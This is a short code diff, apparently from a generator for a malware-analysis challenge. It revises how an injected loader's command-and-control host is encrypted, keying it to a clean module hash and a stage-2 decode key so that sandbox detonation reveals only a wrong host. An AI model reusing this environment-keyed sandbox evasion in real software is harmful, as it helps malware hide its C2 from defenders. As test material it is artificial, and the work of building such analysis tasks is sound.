@@ -169,11 +169,14 @@ _INJECTED_LOADER = textwrap.dedent('''
 # it. In the sandbox that variable is unset, so the payload decrypts to garbage and never
 # contacts the real host -- a "detonate and capture the socket call" attempt (even with the
 # env generically neutralised) yields a WRONG host that fails the exact-match check. The
-# real key is the trusted build's signing-module hash (sha256 of the clean
-# corp_auth_utils/_signing.py, recoverable from the trusted wheel on disk); recovering the
-# host requires decoding the payload, understanding the env-keying, recomputing that hash,
-# and decrypting. Dynamic execution alone cannot reveal it.
-_BUILD_SIG = hashlib.sha256(_CLEAN_SIGNING.encode()).hexdigest()
+# real key combines TWO independently-recovered ingredients -- the trusted build's
+# signing-module hash (sha256 of the clean corp_auth_utils/_signing.py, recoverable from
+# the trusted wheel's own RECORD on disk) AND the outer stage-2 decode key (the hex string
+# in cachekey.bin, itself only usable once the four-stage transform is understood) -- so
+# reading the trusted wheel's RECORD alone is not sufficient: recovering the host requires
+# genuine static analysis of both the payload's obfuscation and its keying. Dynamic
+# execution alone cannot reveal it.
+_BUILD_SIG = hashlib.sha256((hashlib.sha256(_CLEAN_SIGNING.encode()).hexdigest() + XOR_KEY_HEX).encode()).hexdigest()
 _KEY16 = bytes.fromhex(_BUILD_SIG)[:16]
 _ENC_HOST = bytes(b ^ _KEY16[i % 16] for i, b in enumerate(C2_HOST.encode()))
 
